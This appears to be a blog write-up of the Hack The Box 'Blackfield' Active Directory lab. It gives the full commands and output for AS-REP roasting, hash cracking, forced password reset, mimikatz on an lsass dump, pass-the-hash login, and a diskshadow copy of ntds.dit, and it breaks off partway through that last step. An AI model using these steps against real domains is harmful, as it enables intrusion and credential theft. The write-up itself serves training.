---
layout: post
author: Siddhant Chouhan
title: Hack The Box Blackfield Writeup
date: 2020-10-03 12:20:00 +0530
categories: [HackTheBox,Windows Machines]
tags: [hackthebox, Blackfield, ctf, smbclient, kerberos, as-rep-roast, hashcat, bloodhound, bloodhound-py, rpc-password-reset, mimikatz, evil-winrm, sebackupprivilege, diskshadow, ntds, system, secretsdump, hash]
image: /assets/img/Posts/Blackfield.png
---

## Overview:

This windows box required a lot of enumeration and was focussed on Active Directory.
It starts with us finding anonymous access to a smb share which had a lot of directories which turn out be usernames.
We pass the username list we get to Kerberos with help of <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> for generating TGT for valid users and cracking the hash we get with help of hashcat i.e. <code class="language-plaintext highlighter-rouge">AS-REP Roasting</code>.
Then we are able to login into rpcclient and change the password of another user, getting access to another smb share.
The smb share contained a zip file which had a DMP file (a memory dump file).
We use <code class="language-plaintext highlighter-rouge">mimikatz</code> on the DMP file and get the NTLM hash for a user on the box.
After logging in with help of <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> we find that the user svc_backup has <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> which means we can backup files.
So backup the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file and the registry SYSTEM file, now we can use secretsdump.py to get the NTLM hash of the Administrator.
Now we can use Evil-WinRM to login as Administrator.
 
## Enumeration
### Nmap Scan
 
```sql

Nmap 7.80 scan initiated Tue Aug  4 17:17:38 2020 as: nmap -sC -sV -oN nmap_scan 10.10.10.192
Nmap scan report for 10.10.10.192
Host is up (0.25s latency).
Not shown: 993 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-08-04 18:48:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=8/4%Time=5F294AF8%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m19s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-08-04T18:50:52
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
#Nmap done at Tue Aug  4 17:21:12 2020 -- 1 IP address (1 host up) scanned in 214.76 seconds
```
### Enumerating SMB shares

```shell
sid@kali:~/flags/hackthebox/windows-machines/blackfield$ smbclient -L 10.10.10.192
Enter WORKGROUP\sid's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```


We have anonymous login to the forensic share and the profiles$ share.<br>
```shell
sid@kali:~$ smbclient //10.10.10.192/forensic 
Enter WORKGROUP\sid's password: 
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 
```
But it seems we currently don't have permission to list files in the forensic share. Let's look at the profiles$ share
```shell
sid@kali:~$ smbclient //10.10.10.192/profiles$                                                                                                          1 ⨯
Enter WORKGROUP\sid's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 22:17:12 2020
  ..                                  D        0  Wed Jun  3 22:17:12 2020
  AAlleni                             D        0  Wed Jun  3 22:17:11 2020
  ABarteski                           D        0  Wed Jun  3 22:17:11 2020
  ABekesz                             D        0  Wed Jun  3 22:17:11 2020
  ABenzies                            D        0  Wed Jun  3 22:17:11 2020
  ABiemiller                          D        0  Wed Jun  3 22:17:11 2020
  AChampken                           D        0  Wed Jun  3 22:17:11 2020
  ACheretei                           D        0  Wed Jun  3 22:17:11 2020
  ACsonaki                            D        0  Wed Jun  3 22:17:11 2020
  AHigchens                           D        0  Wed Jun  3 22:17:11 2020
  AJaquemai                           D        0  Wed Jun  3 22:17:11 2020
  AKlado                              D        0  Wed Jun  3 22:17:11 2020
  AKoffenburger                       D        0  Wed Jun  3 22:17:11 2020
  AKollolli                           D        0  Wed Jun  3 22:17:11 2020
  AKruppe                             D        0  Wed Jun  3 22:17:11 2020
  AKubale                             D        0  Wed Jun  3 22:17:11 2020
  ALamerz                             D        0  Wed Jun  3 22:17:11 2020
  AMaceldon                           D        0  Wed Jun  3 22:17:11 2020
  AMasalunga                          D        0  Wed Jun  3 22:17:11 2020
  ANavay                              D        0  Wed Jun  3 22:17:11 2020
  ANesterova                          D        0  Wed Jun  3 22:17:11 2020
  ANeusse                             D        0  Wed Jun  3 22:17:11 2020
  AOkleshen                           D        0  Wed Jun  3 22:17:11 2020
  APustulka                           D        0  Wed Jun  3 22:17:11 2020
  ARotella                            D        0  Wed Jun  3 22:17:11 2020
  ASanwardeker                        D        0  Wed Jun  3 22:17:11 2020
  AShadaia                            D        0  Wed Jun  3 22:17:11 2020
  ASischo                             D        0  Wed Jun  3 22:17:11 2020
  ASpruce                             D        0  Wed Jun  3 22:17:11 2020
  ATakach                             D        0  Wed Jun  3 22:17:11 2020
  ATaueg                              D        0  Wed Jun  3 22:17:11 2020
  ATwardowski                         D        0  Wed Jun  3 22:17:11 2020
  audit2020                           D        0  Wed Jun  3 22:17:11 2020
  AWangenheim                         D        0  Wed Jun  3 22:17:11 2020
  AWorsey                             D        0  Wed Jun  3 22:17:11 2020
  AZigmunt                            D        0  Wed Jun  3 22:17:11 2020
  BBakajza                            D        0  Wed Jun  3 22:17:11 2020
  BBeloucif                           D        0  Wed Jun  3 22:17:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 22:17:11 2020
  BConsultant                         D        0  Wed Jun  3 22:17:11 2020
  BErdossy                            D        0  Wed Jun  3 22:17:11 2020
  BGeminski                           D        0  Wed Jun  3 22:17:11 2020
  BLostal                             D        0  Wed Jun  3 22:17:11 2020
  BMannise                            D        0  Wed Jun  3 22:17:11 2020
  BNovrotsky                          D        0  Wed Jun  3 22:17:11 2020
  BRigiero                            D        0  Wed Jun  3 22:17:11 2020
  BSamkoses                           D        0  Wed Jun  3 22:17:11 2020
  .....
  .....
  .....
  ZMiick                              D        0  Wed Jun  3 22:17:12 2020
  ZScozzari                           D        0  Wed Jun  3 22:17:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 22:17:12 2020
  ZWausik                             D        0  Wed Jun  3 22:17:12 2020

                7846143 blocks of size 4096. 3881279 blocks available
smb: \> 
```
All these directories are empty, but the names of these directories look like usernames,<br>
let's make a wordlist awk can help us in doing this.
Copy and paste the above output in a file usernames.txt
```shell
sid@kali:~$ awk '{ print $1 }' usernames.txt > users.lst
```
### Generating TGT with help of GetNPUsers.py

We can use GetNPUsers.py from impacket which can check if there are any valid usernames and if they don't require Kerberos pre-authentication(PREAUTH) enabled.<br>
From the nmap scan we know that the domain name is BLACKFIELD.local<br>

```shell
sid@kali:~$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.192 -usersfile users.lst -outputfile kerberos_hashes.txt   -no-pass BLACKFIELD.local/
```
```
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
We find that we get a hash for the username support.
```
sid@kali:~$ cat kerberos_hashes.txt                                                                                                                  
$krb5asrep$23$support@BLACKFIELD.LOCAL:06d8731e38f1df329fca9472d1c401d1$370b735a62e04596ecb1314328537410c072db996557c731c5e1bb4fd
3ce9cdb0edf2e1c3e62ec133065302e2f9f71b315586c68a0c80e68925d27a350ba9c4165e5485089fb43db2ebad7838948de7d0d1bfda6605b89abf1bcab713c
b369b008bff2773e36bf6a90594b25d9e4e43339d28e8b3e00ab82063eddeca36716411baa48b31e1d3926a42febed1906fe340f49ef0332946f9e031ba291d8b
159f3765433e67ee47695652a7c6d13b7c22c450d73d63198023030a4ca2c0db2ce86b4f73d1bc3f74c2449021e66d4e976007500211fd6cf587a5ee10047b6eb
650afda5a4e059c2aab86f4e4fd6ff70b93d6f49af71
```
We can crack this Kerberos AS-REP hash with help of hashcat.
```
sid@kali:~$ hashcat -m 18200 -a 0 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt --force 

hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-4210U CPU @ 1.70GHz, 5748/5812 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
...
...
...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$support@BLACKFIELD.LOCAL:06d8731e38f1df329fca9472d1c401d1$370b735a62e04596ecb1314328537410c072db996557c731c5e1bb4fd3ce9cdb
0edf2e1c3e62ec133065302e2f9f71b315586c68a0c80e68925d27a350ba9c4165e5485089fb43db2ebad7838948de7d0d1bfda6605b89abf1bcab713cb369b008bff277
3e36bf6a90594b25d9e4e43339d28e8b3e00ab82063eddeca36716411baa48b31e1d3926a42febed1906fe340f49ef0332946f9e031ba291d8b159f3765433e67ee47695
652a7c6d13b7c22c450d73d63198023030a4ca2c0db2ce86b4f73d1bc3f74c2449021e66d4e976007500211fd6cf587a5ee10047b6eb650afda5a4e059c2aab86f4e4fd6
ff70b93d6f49af71:#00^BlackKnight
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:06d8731e38f1...49af71
Time.Started.....: Fri Oct  2 18:49:17 2020, (33 secs)
Time.Estimated...: Fri Oct  2 18:49:50 2020, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   444.9 kH/s (11.43ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 14336000/14344385 (99.94%)
Rejected.........: 0/14336000 (0.00%)
Restore.Point....: 14327808/14344385 (99.88%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $Cah$ -> #!hrvert

Started: Fri Oct  2 18:48:48 2020
Stopped: Fri Oct  2 18:49:51 2020
```
Great let's save these credentials, support:#00^BlackKnight<br>
Now we can enumerate smb and rpc with these creds<br>
```shell
sid@kali:~$ rpcclient -U 'support' 10.10.10.192                                                                                                         1 ⨯
Enter WORKGROUP\support's password: 
rpcclient $> enumdomusers 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
user:[BLACKFIELD764430] rid:[0x451]
user:[BLACKFIELD538365] rid:[0x452]
user:[BLACKFIELD189208] rid:[0x453]
user:[BLACKFIELD404458] rid:[0x454]
...
...
user:[BLACKFIELD307633] rid:[0x57e]
user:[BLACKFIELD758945] rid:[0x57f]
user:[BLACKFIELD541148] rid:[0x580]
user:[BLACKFIELD532412] rid:[0x581]
user:[BLACKFIELD996878] rid:[0x582]
user:[BLACKFIELD653097] rid:[0x583]
user:[BLACKFIELD438814] rid:[0x584]
user:[svc_backup] rid:[0x585]
user:[lydericlefebvre] rid:[0x586]
rpcclient $> 
```
Let's see the password characterstics for the following users.
```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
user:[svc_backup] rid:[0x585]
user:[lydericlefebvre] rid:[0x586]
```
```shell
rpcclient $> getusrdompwinfo 0x44f
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE

rpcclient $> getusrdompwinfo 0x1f6
    &info: struct samr_PwInfo
        min_password_length      : 0x0000 (0)
        password_properties      : 0x00000000 (0)
               0: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE
               
rpcclient $> getusrdompwinfo 0x1f5
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE

rpcclient $> getusrdompwinfo 0x1f4
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE

rpcclient $> getusrdompwinfo 0x585
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE

rpcclient $> getusrdompwinfo 0x586
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE

rpcclient $> 

```
At first i thought since for the user krbtgt the DOMAIN_PASSWORD_COMPLEX is 0 which means the password is only alphanumeric if it was 1 instead there would be special characters as well, here the password for the user krbtgt doesn't follow the password policy and can be cracked?!
But if we try to get the TGT for krbtgt we get the error credentials have been revoked for the user krbtgt. We need to think of something else.<br>
### Enumerating Active Directory with Bloodhound
[https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)<br>
We can enumerate AD with the support user, first of all mark the support user as owned, mark the audit2020 user as high value.<br>
Then right click on the audit2020 user and select 'Shortest Path to Here from Owned'.
```shell
sid@kali:/opt/BloodHound.py$ sudo python3 bloodhound.py  -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c DcOnly
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 groups
INFO: Found 1 computers
INFO: Found 0 trusts
INFO: Done in 00M 14S

sid@kali:/opt/BloodHound.py$ sudo bloodhound
```
<p class="aligncenter">
<img src="/assets/images/bloodhound.png">
<br>
<br>  
<img src="/assets/images/force-change-passwod.png">
</p>

So the support user we own can reset audit2020's password.<br>
[https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/) <br>
According to this article, we can change the password of a non-admin account using rpcclient ,so we should be able to change the password of the audit 2020 account and we might be able to see the forensic share now.
```shell
rpcclient $> setuserinfo2 
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER
rpcclient $> setuserinfo2 audit2020 23 'hello1234567'
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION
rpcclient $> setuserinfo2 audit2020 23 'hello123456#'
rpcclient $> 
```
As you can see if i set the password to just an alphanumeric value I get NT_STATUS_PASSWORD_RESTRICTION, this is because DOMAIN_PASSWORD_COMPLEX=1 for audit2020,
So we have to set a password with atleast 1 special character and minimum length is 7 since min_password_length      : 0x0007 (7).
Now let's look at the forensic smb share, credentials are audit2020:hello123456#
```shell
sid@kali:~$ smbclient -U 'audit2020'  //10.10.10.192/forensic
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 18:33:16 2020
  ..                                  D        0  Sun Feb 23 18:33:16 2020
  commands_output                     D        0  Sun Feb 23 23:44:37 2020
  memory_analysis                     D        0  Fri May 29 01:58:33 2020
  tools                               D        0  Sun Feb 23 19:09:08 2020
cd 
                7846143 blocks of size 4096. 3877722 blocks available
smb: \> cd memory_analysis\
smb: \memory_analysis\> ls
  .                                   D        0  Fri May 29 01:58:33 2020
  ..                                  D        0  Fri May 29 01:58:33 2020
  conhost.zip                         A 37876530  Fri May 29 01:55:36 2020
  ctfmon.zip                          A 24962333  Fri May 29 01:55:45 2020
  dfsrs.zip                           A 23993305  Fri May 29 01:55:54 2020
  dllhost.zip                         A 18366396  Fri May 29 01:56:04 2020
  ismserv.zip                         A  8810157  Fri May 29 01:56:13 2020
  lsass.zip                           A 41936098  Fri May 29 01:55:08 2020
  mmc.zip                             A 64288607  Fri May 29 01:55:25 2020
  RuntimeBroker.zip                   A 13332174  Fri May 29 01:56:24 2020
  ServerManager.zip                   A 131983313  Fri May 29 01:56:49 2020
  sihost.zip                          A 33141744  Fri May 29 01:57:00 2020
  smartscreen.zip                     A 33756344  Fri May 29 01:57:11 2020
  svchost.zip                         A 14408833  Fri May 29 01:57:19 2020
  taskhostw.zip                       A 34631412  Fri May 29 01:57:30 2020
  winlogon.zip                        A 14255089  Fri May 29 01:57:38 2020
  wlms.zip                            A  4067425  Fri May 29 01:57:44 2020
  WmiPrvSE.zip                        A 18303252  Fri May 29 01:57:53 2020

                7846143 blocks of size 4096. 3877722 blocks available
smb: \memory_analysis\> get ctfmon.zip
parallel_read returned NT_STATUS_IO_TIMEOUT

```
 No matter which file i try to download it says NT_STATUS_TO_TIMEOUT, Found this article online, 
 [https://support.zadarastorage.com/hc/en-us/articles/213024986-How-to-Mount-a-SMB-Share-in-Ubuntu](https://support.zadarastorage.com/hc/en-us/articles/213024986-How-to-Mount-a-SMB-Share-in-Ubuntu) <br>
 This is  a bit unstable, but after some tries
 I was able to mount the memory_analysis folder now i tried copying the zip files one at a time.
 ```shell
 sid@kali:~$ sudo mount -t cifs //10.10.10.192/forensic /mnt -o user=audit2020
 Password for audit2020@//10.10.10.192/forensic:  ************
```
After a few tries i was finally able to successfully copy the zip files,turns out that the lsass.zip file contains a .DMP file
So this file is like a dump of the system.
It can have some useful system information maybe even NTLM hashes of Admin or other non admin users! let's copy this
file to a windows machine and run mimikatz on it!
### mimikatz on the .DMP file and the aftermath
This article explains how to get clear text password from a memory dump.<br>
[https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330](https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330)
```
mimikatz # sekurlsa::minidump lsass.DMP
mimikatz # sekurlsa::LogonPasswords
```

<img src="/assets/images/mimikatz.png">
so the NTLM hash for the user svc_backup is 9658d1d1dcd9250115e2205d9f48400d<br>
Let's login as svc_backup with Evil-WinRM.
```shell
sid@kali:~$ evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'                                                              1 ⨯

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

**Evil-WinRM** PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
**Evil-WinRM** PS C:\Users\svc_backup\Documents> cd ../Desktop

**Evil-WinRM** PS C:\Users\svc_backup\Desktop> dir


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/2/2020   4:51 AM             34 user.txt


**Evil-WinRM** PS C:\Users\svc_backup\Desktop> type user.txt
39271013f2bb068c6e98b7334486f640
```
And we find the user.txt in the Desktop folder.

## Privilege Escalation

```shell
**Evil-WinRM** PS C:\Users\svc_backup\Desktop> whoami /all
USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
**Evil-WinRM** PS C:\Users\svc_backup\Desktop> 
```
So the user svc_backup has SeBackupPrivelege which means we can backup files. The following articles were helpful:<br>
[https://medium.com/palantir/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e](https://medium.com/palantir/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e)<br>
So what we can backup and download the ntds.dit file, the registry SYSTEM file and then run secretsdump.py to retrieve the Administrator hash.
>  The ntds. dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain<br>

[https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)<br>

[https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)<br>

We can use disk shadow which will let us create a new volume and alias it with the c: volume.<br>

[https://pentestlab.blog/tag/diskshadow/](https://pentestlab.blog/tag/diskshadow/)<br>
This explains exactly what we have to do.<br>
First we have to make a txt file which will contain all the commands to be used with disk shadow.
```
set context persistent nowriters
add volume c: alias sidd
create
expose %sidd% v:
exec "C:\Windows\System32\cmd.exe" /C copy v:\windows\ntds\ntds.dit c:\temp\ntds.dit
```
```shell
**Evil-WinRM** PS C:\temp> diskshadow /s sid.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  10/3/2020 6:09:27 AM

-> set context persistent nowriter

SET CONTEXT { CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] }

        CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.
        PERSISTENT              Specify that shadow copy is persist across program exit, reset or reboot.
        PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.
        VOLATILE                Specify that shadow copy will be deleted on exit or reset.
        VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.

        Example: SET CONTEXT CLIENTACCESSIBLE
**Evil-WinRM** PS C:\temp> 
```

It says error on first line set context persistent nowriter but in my txt file i have written nowriters maybe it is eating up one character lets add a 0 at the end of each line then.
```
set context persistent nowriters0
add volume c: alias sidd0
create0
expose %sidd% v:0
exec "C:\Windows\System32\cmd.exe" /C copy v:\windows\ntds\ntds.dit c:\temp\ntds.dit0
```
Now let's upload our edited txt file and use diskshadow.
```shell
**Evil-WinRM** PS C:\temp> upload sidchn.txt
Info: Uploading sidchn.txt to C:\temp\sidchn.txt

                                                             
Data: 228 bytes of 228 bytes copied

Info: Upload successful!

**Evil-WinRM** PS C:\temp> diskshadow /s sidchn.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  10/3/2020 6:12:53 AM

-> set context persistent nowriters
-> add volume c: alias sidd
-> create
Alias sidd for shadow ID {b6a808bd-2394-4e03-b06e-60f5580061c9} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {e0ab325c-f672-468b-bd5d-10e0e67db9d4} set as environment variable.

Querying all shadow copies with the shadow copy set ID {e0ab325c-f672-468b-bd5d-10e0e67db9d4}

        * Shadow copy ID = {b6a808bd-2394-4e03-b06e-60f5580061c9}               %sidd%
                - Shadow copy set: {e0ab325c-f672-468b-bd5d-10e0e67db9d4}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 10/3/2020 6:12:54 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

